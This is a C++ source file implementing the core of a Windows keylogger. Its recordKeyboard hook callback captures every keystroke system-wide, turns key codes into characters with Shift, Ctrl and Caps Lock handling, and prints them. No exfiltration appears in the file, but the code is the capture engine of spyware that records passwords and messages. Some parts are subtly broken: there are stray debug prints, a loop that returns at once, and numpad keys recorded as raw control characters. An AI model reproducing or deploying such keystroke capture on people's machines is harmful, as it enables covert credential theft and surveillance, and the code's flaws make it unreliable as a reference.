#include "KeyLogger.h"

KeyLogger::KeyLogger() {}

KeyLogger::~KeyLogger() {}



bool isShiftOn{};
bool isCtrlOn{};
bool isCapsOn{};

// function listens to all keyboard clicks. Will be used as a thread
LRESULT CALLBACK  KeyLogger::recordKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
	while (true)
	{
		static int last;
		BOOL letter = 1;
		std::string key_event = "";

		if (nCode == HC_ACTION) { // if the wParam and lParam parameters contain information about a keystroke message
			char cur_char;
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			int code = p->vkCode;
			if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) // key is released
			{
				if (code == VK_LSHIFT || code == VK_RSHIFT) { isShiftOn = false; }
				if (code == VK_LCONTROL || code == VK_RCONTROL) { isCtrlOn = false; }
				std::cout << "nave";
			}
			if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) // key is pressed
			{
				// cout << hex << in;
				// /*
				if (code == VK_LSHIFT || code == VK_RSHIFT) { isShiftOn = true; }
				if (isCtrlOn == true && code != VK_LCONTROL && code != VK_RCONTROL) { key_event += "<CTRL+"; }
				if (code == VK_LCONTROL || code == VK_RCONTROL) { isCtrlOn = true; }


				//A-Z: WORKING
				if (65 <= code && code <= 90)
				{
					cur_char = code;
					if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
						isCapsOn = true;
					else
						isCapsOn = false;
					if (!(isShiftOn ^ isCapsOn)) key_event += tolower(cur_char);
					else key_event += cur_char;
				}

				//Speical chars WORKING
				switch (code)
				{
				case VK_BACK:
					key_event += "<backspace>";
					break;
				case VK_ESCAPE:
					key_event += "<esc>";
					break;
				case VK_LMENU:
					key_event += "<alt>";
					break;
				case VK_RMENU:
					key_event += "<alt>";
					break;
				case VK_LWIN:
					key_event += "<win-key>";
					break;
				case VK_RWIN:
					key_event += "<win-key>";
					break;
				case VK_APPS:
					key_event += "<menu-key>";
					break;
				case VK_PRIOR:
					key_event += "<page-up>";
					break;
				case VK_NEXT:
					key_event += "<page-down>";
					break;
				case VK_END:
					key_event += "<end>";
					break;
				case VK_HOME:
					key_event += "<home>";
					break;
				case VK_LEFT:
					key_event += "<left>";
					break;
				case VK_RIGHT:
					key_event += "<right>";
					break;
				case VK_UP:
					key_event += "<up>";
					break;
				case VK_DOWN:
					key_event += "<down>";
					break;
				case VK_INSERT:
					key_event += "<ins>";
					break;
				case VK_DELETE:
					key_event += "<del>";
					break;
				case VK_HELP:
					key_event += "<help>";
					break;
				case VK_PRINT:
					key_event += "<print>";
					break;
				case VK_SLEEP:
					key_event += "<sleep>";
					break;
				case VK_PAUSE:
					key_event += "<pause>";
					break;
				case VK_SNAPSHOT:
					key_event += "<print-screen>";
					break;
				case VK_SPACE:
					key_event += " ";
					break;
				case VK_RETURN:
					key_event += "<enter>";
					break;
				case VK_OEM_MINUS: //Speical + shifts
					std::cout << isShiftOn;
					if (isShiftOn == false) { key_event += "-"; }
					else { key_event += "_"; }
					break;
				case VK_OEM_PLUS:
					if (isShiftOn == false) { key_event += "="; }
					else { key_event += "+"; }
					break;
				case VK_OEM_1:
					if (isShiftOn == false) { key_event += ";"; }
					else { key_event += ":"; }
					break;
				case VK_OEM_2:
					if (isShiftOn == false) { key_event += "/"; }
					else { key_event += "\?"; }
					break;
				case VK_OEM_3:
					if (isShiftOn == false) { key_event += "`"; }
					else { key_event += "~"; }
					break;
				case VK_OEM_4:
					if (isShiftOn == false) { key_event += "["; }
					else { key_event += "{"; }
					break;
				case VK_OEM_5:
					if (isShiftOn == false) { key_event += "\\"; }
					else { key_event += "|"; }
					break;
				case VK_OEM_6:
					if (isShiftOn == false) { key_event += "]"; }
					else { key_event += "}"; }
					break;
				case VK_OEM_7:
					if (isShiftOn == false) { key_event += "\'"; }
					else { key_event += "\""; }
					break;
				case VK_OEM_PERIOD:
					if (isShiftOn == false) { key_event += "."; }
					else { key_event += ">"; }
					break;
				case VK_OEM_COMMA:
					if (isShiftOn == false) { key_event += ","; }
					else { key_event += "<"; }
					break;
				case VK_DIVIDE:
					key_event += "/";
					break;
				case VK_MULTIPLY:
					key_event += "*";
					break;
				case VK_SUBTRACT:
					key_event += "-";
					break;
				case VK_ADD:
					key_event += "+";
					break;
				case VK_DECIMAL:
					key_event += ".";
					break;
				case VK_TAB:
					key_event += "\t";
					break;
				}

				// up numbers WORKING
				if (48 <= code && code <= 57)
				{
					if (isShiftOn == false)
					{
						char digit[2];
						sprintf_s(digit, 2, "%d", (code - 48));
						key_event += digit;
					}
					else
					{
						switch (code)
						{
						case 48:
							key_event += ")";
							break;
						case 49:
							key_event += "!";
							break;
						case 50:
							key_event += "@";
							break;
						case 51:
							key_event += "#";
							break;
						case 52:
							key_event += "$";
							break;
						case 53:
							key_event += "%";
							break;
						case 54:
							key_event += "^";
							break;
						case 55:
							key_event += "&";
							break;
						case 56:
							key_event += "*";
							break;
						case 57:
							key_event += "(";
							break;
						}
					}
				}
				// F-Keys:
				if (112 <= code && code <= 135)
				{
					char digit[10];
					sprintf_s(digit, 10, "<F%d>", (code - 111));
					key_event += digit;
				}
				// Left Number-Pad:
				if (96 <= code && code <= 105) { key_event += code - 96; }
				if (isCtrlOn == true && code != VK_LCONTROL && code != VK_RCONTROL) { key_event += ">"; }
			}
		}
		std::cout << key_event;
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
}
